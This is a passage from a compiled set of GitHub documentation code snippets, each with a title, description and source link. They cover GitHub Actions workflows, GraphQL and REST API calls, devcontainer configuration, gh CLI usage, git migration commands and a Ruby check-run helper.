// Pull out the array of items\n  const namespaceKey = Object.keys(data)[0];\n  data = data[namespaceKey];\n\n  return data;\n}\n\nconst data = await getPaginatedData(\"/repos/octocat/Spoon-Knife/issues\");\n\nconsole.log(data);\n```\n\n----------------------------------------\n\nTITLE: Configuring features in devcontainer.json for C# (.NET)\nDESCRIPTION: This code snippet demonstrates how to configure features within the `devcontainer.json` file for a C# (.NET) project, using the ghcr.io/devcontainers/features/dotnet:1 feature.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-dotnet-project-for-codespaces.md#_snippet_1\n\nLANGUAGE: JSONC\nCODE:\n```\n     \"features\": {\n       \"ghcr.io/devcontainers/features/dotnet:1\": {}\n     },\n\n     // Features to add to the dev container. More info: https://containers.dev/features.\n     // \"features\": {},\n   \n```\n\n----------------------------------------\n\nTITLE: Advanced Issue Filter: Boolean OR\nDESCRIPTION: This example demonstrates the use of the `OR` boolean operator for filtering issues. It returns issues that are assigned to either @octocat or @hubot. The `OR` operator means that an issue is included in the results if at least one of the specified conditions is true.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/filtering-and-searching-issues-and-pull-requests.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nassignee:octocat OR assignee:hubot\n```\n\n----------------------------------------\n\nTITLE: Example bash script for a gh extension\nDESCRIPTION: A bash script for a `gh` extension that fetches user information using `gh api` and prints a formatted string containing the username and name. It uses `jq` to parse the JSON output of the `gh api` command.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_6\n\nLANGUAGE: Bash\nCODE:\n```\n#!/usr/bin/env bash\nset -e\nexec gh api user --jq '\"You are @\\(.login) (\\(.name)).\"'\n```\n\n----------------------------------------\n\nTITLE: Splitting Up Large Methods in Java\nDESCRIPTION: This Java method processes a customer order, including validation, price calculation, status updates, and printing a summary. Copilot Chat is used to refactor the method into smaller, more focused methods (validateOrder, calculateTotalPrice, updateOrderStatus, printOrderSummary) to improve reusability and maintainability.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/improving-code-readability-and-maintainability.md#_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic void processOrder(Order order) {\n  if (order == null || order.getItems().isEmpty()) {\n    throw new IllegalArgumentException(\"Order is invalid.\");\n  }\n\n  double totalPrice = 0.0;\n  for (Item item : order.getItems()) {\n    totalPrice += item.getPrice() * item.getQuantity();\n  }\n  order.setTotalPrice(totalPrice);\n\n  if (totalPrice > 0) {\n    order.setStatus(\"Processed\");\n  } else {\n    order.setStatus(\"Pending\");\n  }\n\n  System.out.println(\"Order for customer \" + order.getCustomerName() + \" has been processed. Total price: \" + totalPrice);\n}\n```\n\nLANGUAGE: java\nCODE:\n```\npublic void processOrder(Order order) {\n    validateOrder(order);\n    double totalPrice = calculateTotalPrice(order);\n    updateOrderStatus(order, totalPrice);\n    printOrderSummary(order, totalPrice);\n}\n\nprivate void validateOrder(Order order) {\n    if (order == null || order.getItems().isEmpty()) {\n        throw new IllegalArgumentException(\"Order is invalid.\");\n    }\n}\n\nprivate double calculateTotalPrice(Order order) {\n    double totalPrice = 0.0;\n    for (Item item : order.getItems()) {\n        totalPrice += item.getPrice() * item.getQuantity();\n    }\n    order.setTotalPrice(totalPrice);\n    return totalPrice;\n}\n\nprivate void updateOrderStatus(Order order, double totalPrice) {\n    if (totalPrice > 0) {\n        order.setStatus(\"Processed\");\n    } else {\n        order.setStatus(\"Pending\");\n    }\n}\n\nprivate void printOrderSummary(Order order, double totalPrice) {\n    System.out.println(\"Order for customer \" + order.getCustomerName() + \" has been processed. Total price: \" + totalPrice);\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Codespace with Retention Period - GitHub CLI\nDESCRIPTION: This snippet demonstrates how to create a GitHub Codespace using the GitHub CLI (`gh`) and set a specific retention period for it. The `--retention-period` flag is used to specify the number of days (DAYS) for which the codespace should be retained after it is stopped. The retention period must be between 0 and 30 days.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-your-user-preferences/configuring-automatic-deletion-of-your-codespaces.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace create --retention-period DAYS\n```\n\n----------------------------------------\n\nTITLE: Jobs Context Example\nDESCRIPTION: This JSON snippet provides an example of the `jobs` context which is available within reusable workflows. It shows the result (`success`, `failure`, etc.) and outputs for a job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_9\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"example_job\": {\n    \"result\": \"success\",\n    \"outputs\": {\n      \"output1\": \"hello\",\n      \"output2\": \"world\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Cloning SVN Repo with git svn (Standard Layout) - Shell\nDESCRIPTION: This command clones a Subversion repository into a Git repository using `git svn clone`. The `-s` flag indicates a standard Subversion layout (trunk, branches, tags).  `URL` should be replaced with the Subversion repository URL, `PATH/TO/DESTINATION` with the desired directory, and `PATH/TO/AUTHORS.TXT` with the path to the authors file. Requires `git-svn` to be installed and configured. Example provided for cloning the Logisim project.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-a-subversion-repository.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit svn clone -s URL PATH/TO/DESTINATION --authors-file PATH/TO/AUTHORS.TXT\n```\n\nLANGUAGE: shell\nCODE:\n```\ngit svn clone -s https://svn.code.sf.net/p/circuit/code logisim --authors-file path/to/authors.txt\n```\n\n----------------------------------------\n\nTITLE: Example Node Configuration - Text\nDESCRIPTION: This snippet shows an example of how a node's section should appear after adding the datacenter assignment. It includes the `datacenter`, `hostname`, and `ipv4` key-value pairs. The `datacenter` key-value pair assigns the node to a specific datacenter within the cluster.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/configuring-high-availability-replication-for-a-cluster.md#_snippet_3\n\nLANGUAGE: text\nCODE:\n```\n[cluster \"HOSTNAME\"]\n  datacenter = default\n  hostname = HOSTNAME\n  ipv4 = IP-ADDRESS\n  ...\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on page_build events in YAML\nDESCRIPTION: This YAML snippet configures a GitHub workflow to trigger when a `page_build` event occurs. This event is triggered when someone pushes to a branch that is the publishing source for GitHub Pages. The workflow uses the `on` keyword to specify the trigger event.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_17\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  page_build\n```\n\n----------------------------------------\n\nTITLE: Finding All User Projects Node IDs (curl)\nDESCRIPTION: This snippet demonstrates how to find the node ID and title of all projects for a user using a curl command with a GraphQL query. Replace `USER` with the user's username. It returns the first 20 projects. Requires a `TOKEN` with `read:project` scope.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"{user(login: \\\"USER\\\") {projectsV2(first: 20) {nodes {id title}}}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Starting Repository Migration with GraphQL\nDESCRIPTION: This GraphQL mutation starts the migration of a repository. It requires parameters such as the source ID, owner ID, source repository URL, repository name, access tokens, and target repository visibility.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-githubcom-to-github-enterprise-cloud.md#_snippet_2\n\nLANGUAGE: graphql\nCODE:\n```\nmutation startRepositoryMigration (\n  $sourceId: ID!,\n  $ownerId: ID!,\n  $sourceRepositoryUrl: URI!,\n  $repositoryName: String!,\n  $continueOnError: Boolean!,\n  $accessToken: String!,\n  $githubPat: String!,\n  $targetRepoVisibility: String!\n){\n  startRepositoryMigration( input: {\n    sourceId: $sourceId,\n    ownerId: $ownerId,\n    repositoryName: $repositoryName,\n    continueOnError: $continueOnError,\n    accessToken: $accessToken,\n    githubPat: $githubPat,\n    targetRepoVisibility: $targetRepoVisibility\n    sourceRepositoryUrl: $sourceRepositoryUrl,\n  }) {\n    repositoryMigration {\n      id\n      migrationSource {\n        id\n        name\n        type\n      }\n      sourceUrl\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Cloning a Git Repository Bare - Shell\nDESCRIPTION: Clones an external Git repository in bare mode. This creates a local copy of the repository without a working directory, which is suitable for mirroring. The command requires Git to be installed and accessible in the command line.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-an-external-git-repository-using-the-command-line.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ git clone --bare https://external-host.com/EXTUSER/REPO.git\n# Makes a bare clone of the external repository in a local directory\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow for Redelivering Failed Webhook Deliveries (YAML)\nDESCRIPTION: This GitHub Actions workflow is configured to run periodically (every 6 hours) or when manually triggered. It checks out the repository, sets up Node.js, installs the octokit library, and then executes a Node.js script to find and redeliver failed webhook deliveries. The workflow uses a personal access token (PAT) stored as a secret to authenticate and interact with the GitHub API.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/automatically-redelivering-failed-deliveries-for-an-organization-webhook.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n#\nname: Redeliver failed webhook deliveries\n\n# This workflow runs every 6 hours or when manually triggered.\non:\n  schedule:\n    - cron: '15 */6 * * *'\n  workflow_dispatch:\n\n# This workflow will use the built in `GITHUB_TOKEN` to check out the repository contents. This grants `GITHUB_TOKEN` permission to do that.\npermissions:\n  contents: read\n\n#\njobs:\n  redeliver-failed-deliveries:\n    name: Redeliver failed deliveries\n    runs-on: ubuntu-latest\n    steps:\n      # This workflow will run a script that is stored in the repository. This step checks out the repository contents so that the workflow can access the script.\n      - name: Check out repo content\n        uses: {% data reusables.actions.action-checkout %}\n\n      # This step sets up Node.js. The script that this workflow will run uses Node.js.\n      - name: Setup Node.js\n        uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '18.x'\n\n      # This step installs the octokit library. The script that this workflow will run uses the octokit library.\n      - name: Install dependencies\n        run: npm install octokit\n\n      # This step sets some environment variables, then runs a script to find and redeliver failed webhook deliveries.\n      # - Replace `YOUR_SECRET_NAME` with the name of the secret where you stored your {% data variables.product.pat_generic %}.\n      # - Replace `YOUR_ORGANIZATION_NAME` with the name of the organization where the webhook was created.\n      # - Replace `YOUR_HOOK_ID` with the ID of the webhook.\n      # - Replace `YOUR_LAST_REDELIVERY_VARIABLE_NAME` with the name that you want to use for a configuration variable that will be stored in the repository where this workflow is stored. The name can be any string that contains only alphanumeric characters and `_`, and does not start with `GITHUB_` or a number. For more information, see [AUTOTITLE](/actions/learn-github-actions/variables#defining-configuration-variables-for-multiple-workflows).\n      {% ifversion ghes %}# - Replace `YOUR_HOSTNAME` with the name of {% data variables.location.product_location %}.{% endif %}\n      - name: Run script\n        env:\n          TOKEN: {% raw %}${{ secrets.YOUR_SECRET_NAME }}{% endraw %}\n          ORGANIZATION_NAME: 'YOUR_ORGANIZATION_NAME'\n          HOOK_ID: 'YOUR_HOOK_ID'\n          LAST_REDELIVERY_VARIABLE_NAME: 'YOUR_LAST_REDELIVERY_VARIABLE_NAME'\n          {% ifversion ghes %}HOSTNAME: 'YOUR_HOSTNAME'{% endif %}\n          WORKFLOW_REPO_NAME: {% raw %}${{ github.event.repository.name }}{% endraw %}\n          WORKFLOW_REPO_OWNER: {% raw %}${{ github.repository_owner }}{% endraw %}\n        run: |\n          node .github/workflows/scripts/redeliver-failed-deliveries.js\n```\n\n----------------------------------------\n\nTITLE: Defining Upgrades Directory in qlpack.yml (YAML)\nDESCRIPTION: This snippet shows how to define the directory containing database upgrade scripts within a core language pack. The `upgrades` property specifies the relative path to the directory. This is required for core language packs.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_21\n\nLANGUAGE: YAML\nCODE:\n```\nupgrades: .\n```\n\n----------------------------------------\n\nTITLE: Querying audit log events with date and cursor-based pagination\nDESCRIPTION: This cURL command retrieves audit log events for a specific date in an enterprise, using cursor-based pagination. It requires an authorization token and specifies the enterprise, date, and items per page. The `--include` flag ensures that response headers are returned, which contain pagination links.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/using-the-audit-log-api-for-your-enterprise.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncurl --include -H \"Authorization: Bearer TOKEN\" \\\n--request GET \\\n\"{% data variables.product.rest_url %}/enterprises/avocado-corp/audit-log?phrase=created:2022-01-01&per_page=100\"\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow for GKE Deployment\nDESCRIPTION: This YAML file defines a GitHub Actions workflow that builds a Docker image, pushes it to Google Container Registry (GCR), and deploys it to Google Kubernetes Engine (GKE). It configures authentication with Google Cloud using a service account key, builds and pushes a Docker image, sets up Kustomize, and deploys the image to the GKE cluster.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_7\n\nLANGUAGE: YAML\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Build and Deploy to GKE\n\non:\n  push:\n    branches:\n      - main\n\nenv:\n  PROJECT_ID: {% raw %}${{ secrets.GKE_PROJECT }}{% endraw %}\n  GKE_CLUSTER: cluster-1    # Add your cluster name here.\n  GKE_ZONE: us-central1-c   # Add your cluster zone here.\n  DEPLOYMENT_NAME: gke-test # Add your deployment name here.\n  IMAGE: static-site\n\njobs:\n  setup-build-publish-deploy:\n    name: Setup, Build, Publish, and Deploy\n    runs-on: ubuntu-latest\n    environment: production\n\n    steps:\n    - name: Checkout\n      uses: {% data reusables.actions.action-checkout %}\n\n    # Setup gcloud CLI\n    - uses: google-github-actions/setup-gcloud@1bee7de035d65ec5da40a31f8589e240eba8fde5\n      with:\n        service_account_key: {% raw %}${{ secrets.GKE_SA_KEY }}{% endraw %}\n        project_id: {% raw %}${{ secrets.GKE_PROJECT }}{% endraw %}\n\n    # Configure Docker to use the gcloud command-line tool as a credential\n    # helper for authentication\n    - run: |-\n        gcloud --quiet auth configure-docker\n\n    # Get the GKE credentials so we can deploy to the cluster\n    - uses: google-github-actions/get-gke-credentials@db150f2cc60d1716e61922b832eae71d2a45938f\n      with:\n        cluster_name: {% raw %}${{ env.GKE_CLUSTER }}{% endraw %}\n        location: {% raw %}${{ env.GKE_ZONE }}{% endraw %}\n        credentials: {% raw %}${{ secrets.GKE_SA_KEY }}{% endraw %}\n\n    # Build the Docker image\n    - name: Build\n      run: |-\n        docker build \\\n          --tag \"gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\" \\\n          --build-arg GITHUB_SHA=\"$GITHUB_SHA\" \\\n          --build-arg GITHUB_REF=\"$GITHUB_REF\" \\\n          .\n\n    # Push the Docker image to Google Container Registry\n    - name: Publish\n      run: |-\n        docker push \"gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\"\n\n    # Set up kustomize\n    - name: Set up Kustomize\n      run: |-\n        curl -sfLo kustomize https://github.com/kubernetes-sigs/kustomize/releases/download/v3.1.0/kustomize_3.1.0_linux_amd64\n        chmod u+x ./kustomize\n\n    # Deploy the Docker image to the GKE cluster\n    - name: Deploy\n      run: |-\n        ./kustomize edit set image gcr.io/PROJECT_ID/IMAGE:TAG=gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\n        ./kustomize build . | kubectl apply -f -\n        kubectl rollout status deployment/$DEPLOYMENT_NAME\n        kubectl get services -o wide\n```\n\n----------------------------------------\n\nTITLE: Defining DiscussionComment type in GraphQL\nDESCRIPTION: Defines the `DiscussionComment` type with fields for author, body, creation/update timestamps, reactions, replies, and viewer permissions. It implements interfaces like `Comment`, `Deletable`, `Minimizable`, `Node`, `Reactable`, `Updatable`, and `UpdatableComment`. This type represents a single comment on a discussion.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_7\n\nLANGUAGE: GraphQL\nCODE:\n```\n\"\"\"\nA comment on a discussion.\n\"\"\"\ntype DiscussionComment implements Comment & Deletable & Minimizable & Node & Reactable & Updatable & UpdatableComment {\n  \"\"\"\nThe actor who authored the comment.\n  \"\"\"\n  author: Actor\n\n  \"\"\"\n  Author's association with the subject of the comment.\n  \"\"\"\n  authorAssociation: CommentAuthorAssociation!\n\n  \"\"\"\nThe body as Markdown.\n  \"\"\"\n  body: String!\n\n  \"\"\"\nThe body rendered to HTML.\n  \"\"\"\n  bodyHTML: HTML!\n\n  \"\"\"\nThe body rendered to text.\n  \"\"\"\n  bodyText: String!\n\n  \"\"\"\n  Identifies the date and time when the object was created.\n  \"\"\"\n  createdAt: DateTime!\n\n  \"\"\"\n  Check if this comment was created via an email reply.\n  \"\"\"\n  createdViaEmail: Boolean!\n\n  \"\"\"\n  Identifies the primary key from the database.\n  \"\"\"\n  databaseId: Int\n\n  \"\"\"\nThe time when this replied-to comment was deleted\n  \"\"\"\n  deletedAt: DateTime\n\n  \"\"\"\nThe discussion this comment was created in\n  \"\"\"\n  discussion: Discussion\n\n  \"\"\"\nThe actor who edited the comment.\n  \"\"\"\n  editor: Actor\n  id: ID!\n\n  \"\"\"\n  Check if this comment was edited and includes an edit with the creation data\n  \"\"\"\n  includesCreatedEdit: Boolean!\n\n  \"\"\"\n  Has this comment been chosen as the answer of its discussion?\n  \"\"\"\n  isAnswer: Boolean!\n\n  \"\"\"\n  Returns whether or not a comment has been minimized.\n  \"\"\"\n  isMinimized: Boolean!\n\n  \"\"\"\nThe moment the editor made the last edit\n  \"\"\"\n  lastEditedAt: DateTime\n\n  \"\"\"\n  Returns why the comment was minimized.\n  \"\"\"\n  minimizedReason: String\n\n  \"\"\"\n  Identifies when the comment was published at.\n  \"\"\"\n  publishedAt: DateTime\n\n  \"\"\"\n  A list of reactions grouped by content left on the subject.\n  \"\"\"\n  reactionGroups: [ReactionGroup!]\n\n  \"\"\"\n  A list of Reactions left on the Issue.\n  \"\"\"\n  reactions(\n    \"\"\"\n    Returns the elements in the list that come after the specified cursor.\n    \"\"\"\n    after: String\n\n    \"\"\"\n    Returns the elements in the list that come before the specified cursor.\n    \"\"\"\n    before: String\n\n    \"\"\"\n    Allows filtering Reactions by emoji.\n    \"\"\"\n    content: ReactionContent\n\n    \"\"\"\n    Returns the first _n_ elements from the list.\n    \"\"\"\n    first: Int\n\n    \"\"\"\n    Returns the last _n_ elements from the list.\n    \"\"\"\n    last: Int\n\n    \"\"\"\n    Allows specifying the order in which reactions are returned.\n    \"\"\"\n    orderBy: ReactionOrder\n  ): ReactionConnection!\n\n  \"\"\"\n  The threaded replies to this comment.\n  \"\"\"\n  replies(\n    \"\"\"\n    Returns the elements in the list that come after the specified cursor.\n    \"\"\"\n    after: String\n\n    \"\"\"\n    Returns the elements in the list that come before the specified cursor.\n    \"\"\"\n    before: String\n\n    \"\"\"\n    Returns the first _n_ elements from the list.\n    \"\"\"\n    first: Int\n\n    \"\"\"\n    Returns the last _n_ elements from the list.\n    \"\"\"\n    last: Int\n  ): DiscussionCommentConnection!\n\n  \"\"\"\n  The discussion comment this comment is a reply to\n  \"\"\"\n  replyTo: DiscussionComment\n\n  \"\"\"\n  The path for this discussion comment.\n  \"\"\"\n  resourcePath: URI!\n\n  \"\"\"\n  Identifies the date and time when the object was last updated.\n  \"\"\"\n  updatedAt: DateTime!\n\n  \"\"\"\n  The URL for this discussion comment.\n  \"\"\"\n  url: URI!\n\n  \"\"\"\n  A list of edits to this content.\n  \"\"\"\n  userContentEdits(\n    \"\"\"\n    Returns the elements in the list that come after the specified cursor.\n    \"\"\"\n    after: String\n\n    \"\"\"\n    Returns the elements in the list that come before the specified cursor.\n    \"\"\"\n    before: String\n\n    \"\"\"\n    Returns the first _n_ elements from the list.\n    \"\"\"\n    first: Int\n\n    \"\"\"\n    Returns the last _n_ elements from the list.\n    \"\"\"\n    last: Int\n  ): UserContentEditConnection\n\n  \"\"\"\n  Check if the current viewer can delete this object.\n  \"\"\"\n  viewerCanDelete: Boolean!\n\n  \"\"\"\n  Can the current user mark this comment as an answer?\n  \"\"\"\n  viewerCanMarkAsAnswer: Boolean!\n\n  \"\"\"\n  Check if the current viewer can minimize this object.\n  \"\"\"\n  viewerCanMinimize: Boolean!\n\n  \"\"\"\n  Can user react to this subject\n  \"\"\"\n  viewerCanReact: Boolean!\n\n  \"\"\"\n  Can the current user unmark this comment as an answer?\n  \"\"\"\n  viewerCanUnmarkAsAnswer: Boolean!\n\n  \"\"\"\n  Check if the current viewer can update this object.\n  \"\"\"\n  viewerCanUpdate: Boolean!\n\n  \"\"\"\n  Reasons why the current viewer can not update this comment.\n  \"\"\"\n  viewerCannotUpdateReasons: [CommentCannotUpdateReason!]!\n\n  \"\"\"\n  Did the viewer author this comment.\n  \"\"\"\n  viewerDidAuthor: Boolean!\n}\n\n```\n\n----------------------------------------\n\nTITLE: Initiating a GitHub Check Run (Ruby)\nDESCRIPTION: This helper method initiates a check run by updating its status to 'in_progress', cloning the repository, running RuboCop, parsing the output, and then updating the check run again to 'completed' with the RuboCop results. It includes logic to handle annotations and limits the number of annotations to 50.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_48\n\nLANGUAGE: Ruby\nCODE:\n```\n    # Start the CI process\n    def initiate_check_run\n      # Once the check run is created, you'll update the status of the check run\n      # to 'in_progress' and run the CI process. When the CI finishes, you'll\n      # update the check run status to 'completed' and add the CI results.\n\n      @installation_client.update_check_run(\n        @payload['repository']['full_name'],\n        @payload['check_run']['id'],\n        status: 'in_progress',\n        accept: 'application/vnd.github+json'\n      )\n\n      full_repo_name = @payload['repository']['full_name']\n      repository     = @payload['repository']['name']\n      head_sha       = @payload['check_run']['head_sha']\n\n      clone_repository(full_repo_name, repository, head_sha)\n\n      # Run RuboCop on all files in the repository\n      @report = `rubocop '#{repository}' --format json`\n      logger.debug @report\n      `rm -rf #{repository}`\n      @output = JSON.parse @report\n\n      annotations = []\n      # You can create a maximum of 50 annotations per request to the Checks\n      # API. To add more than 50 annotations, use the \"Update a check run\" API\n      # endpoint. This example code limits the number of annotations to 50.\n      # See /rest/reference/checks#update-a-check-run\n      # for details.\n      max_annotations = 50\n\n      # RuboCop reports the number of errors found in \"offense_count\"\n      if @output['summary']['offense_count'] == 0\n        conclusion = 'success'\n      else\n        conclusion = 'neutral'\n        @output['files'].each do |file|\n\n          # Only parse offenses for files in this app's repository\n          file_path = file['path'].gsub(/#{repository}\\//,'')\n          annotation_level = 'notice'\n\n          # Parse each offense to get details and location\n          file['offenses'].each do |offense|\n            # Limit the number of annotations to 50\n            next if max_annotations == 0\n            max_annotations -= 1\n\n            start_line   = offense['location']['start_line']\n            end_line     = offense['location']['last_line']\n            start_column = offense['location']['start_column']\n            end_column   = offense['location']['last_column']\n            message      = offense['message']\n\n            # Create a new annotation for each error\n            annotation = {\n              path: file_path,\n              start_line: start_line,\n              end_line: end_line,\n              start_column: start_column,\n              end_column: end_column,\n              annotation_level: annotation_level,\n              message: message\n            }\n            # Annotations only support start and end columns on the same line\n            if start_line == end_line\n              annotation.merge({start_column: start_column, end_column: end_column})\n            end\n\n            annotations.push(annotation)\n          end\n        end\n      end\n\n      # Updated check run summary and text parameters\n      summary = \"Octo RuboCop summary\\n-Offense count: #{@output['summary']['offense_count']}\\n-File count: #{@output['summary']['target_file_count']}\\n-Target file count: #{@output['summary']['inspected_file_count']}\"\n      text = \"Octo RuboCop version: #{@output['metadata']['rubocop_version']}\"\n\n      # Mark the check run as complete! And if there are warnings, share them.\n      @installation_client.update_check_run(\n        @payload['repository']['full_name'],\n        @payload['check_run']['id'],\n        status: 'completed',\n        conclusion: conclusion,\n        output: {\n          title: 'Octo RuboCop',\n          summary: summary,\n          text: text,\n          annotations: annotations\n        },\n        actions: [{\n          label: 'Fix this',\n          description: 'Automatically fix all linter notices.',\n          identifier: 'fix_rubocop_notices'\n        }],\n        accept: 'application/vnd.github+json'\n      )\n    end\n```\n\n----------------------------------------\n\nTITLE: Full devcontainer.json with postCreateCommand and VS Code Extensions\nDESCRIPTION: This complete `devcontainer.json` file configures a Python 3 development environment with a specific Docker image, installs Coverage.py, runs `pip3 install --user -r requirements.txt` after creation, and installs the \"Code Spell Checker\" VS Code extension. It demonstrates a full setup, incorporating features, post-creation commands, and VS Code customizations.  It uses the `postCreateCommand` to install dependencies and configures a VS Code extension to be installed in the codespace.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-python-project-for-codespaces.md#_snippet_3\n\nLANGUAGE: JSONC\nCODE:\n```\n// For format details, see https://aka.ms/devcontainer.json. For config options, see the\n// README at: https://github.com/devcontainers/templates/tree/main/src/python\n{\n  \"name\": \"Python 3\",\n  // Or use a Dockerfile or Docker Compose file. More info: https://containers.dev/guide/dockerfile\n  \"image\": \"mcr.microsoft.com/devcontainers/python:0-3.11-bullseye\",\n  \"features\": {\n    \"ghcr.io/devcontainers-contrib/features/coverage-py:2\": {}\n  },\n\n  // Use 'forwardPorts' to make a list of ports inside the container available locally.\n  // \"forwardPorts\": [],\n\n  // Use 'postCreateCommand' to run commands after the container is created.\n  \"postCreateCommand\": \"pip3 install --user -r requirements.txt\",\n\n  // Configure tool-specific properties.\n  \"customizations\": {\n    // Configure properties specific to VS Code.\n    \"vscode\": {\n      // Add the IDs of extensions you want installed when the container is created.\n      \"extensions\": [\n        \"streetsidesoftware.code-spell-checker\"\n      ]\n    }\n  }\n\n  // Uncomment to connect as root instead. More info: https://aka.ms/dev-containers-non-root.\n  // \"remoteUser\": \"root\"\n}\n```\n\n----------------------------------------\n\nTITLE: Making a shell script executable\nDESCRIPTION: This command changes the permissions of the `entrypoint.sh` file to make it executable.  This is necessary for the Docker container to be able to run the script as the entrypoint.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/dockerfile-support-for-github-actions.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nchmod +x entrypoint.sh\n```\n\n----------------------------------------\n\nTITLE: SCIM Base URL for GHEC\nDESCRIPTION: Defines the base URL for interacting with the SCIM v2 API for GitHub Enterprise Cloud.  The `{enterprise}` placeholder should be replaced with the actual enterprise name. This URL is used to manage users and groups within the enterprise.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/enterprise-admin/scim.md#_snippet_0\n\nLANGUAGE: HTTP\nCODE:\n```\n{% data variables.product.rest_url %}/scim/v2/enterprises/{enterprise}/\n```\n\n----------------------------------------\n\nTITLE: Querying Organization SAML and SCIM Identities with REST API\nDESCRIPTION: This `curl` command uses the GitHub GraphQL API to fetch SAML and SCIM identities for users within an organization. It requires a personal access token with appropriate permissions.  The command constructs a GraphQL query within the `-d` option to retrieve `nameId` from SAML, `username` from SCIM and the `login` from the user node.  The output is a JSON response containing the requested information.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/managing-saml-single-sign-on-for-your-organization/troubleshooting-identity-and-access-management-for-your-organization.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncurl -X POST -H \"Authorization: Bearer YOUR_TOKEN\" -H \"Content-Type: application/json\" -d '{ \"query\": \"{ organization(login: \\\"ORG\\\") { samlIdentityProvider { externalIdentities(first: 100) { pageInfo { endCursor startCursor hasNextPage } edges { cursor node { samlIdentity { nameId } scimIdentity {username} user { login } } } } } } }\" }' https://api.github.com/graphql\n```\n\n----------------------------------------\n\nTITLE: Cloning a Fork Using Git\nDESCRIPTION: This snippet demonstrates how to clone a forked repository to your local machine using the `git clone` command.  Replace `YOUR-USERNAME` with your GitHub username. This creates a local copy of the repository where you can make changes.  Requires Git to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/exploring-projects-on-github/contributing-to-a-project.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit clone https://{% data variables.product.product_url %}/YOUR-USERNAME/Spoon-Knife\n```\n\n----------------------------------------\n\nTITLE: Forecasting usage for a specific project\nDESCRIPTION: This shell script forecasts GitHub Actions usage based on historical Bitbucket pipeline runs for a specific project. The `gh actions-importer` CLI is used. The `--workspace` flag specifies the Bitbucket workspace, `--project-key` specifies the project, and `--output-dir` sets the output directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer forecast bitbucket --workspace :workspace --project-key :project_key --output-dir tmp/forecast_reports\n```\n\n----------------------------------------\n\nTITLE: Fetching changes from upstream Git repository in Codespaces\nDESCRIPTION: This snippet demonstrates how to fetch the latest changes from the upstream repository within a GitHub Codespaces environment. It uses the `git fetch` command with the `upstream` remote to retrieve updates from the original repository.\nSOURCE: 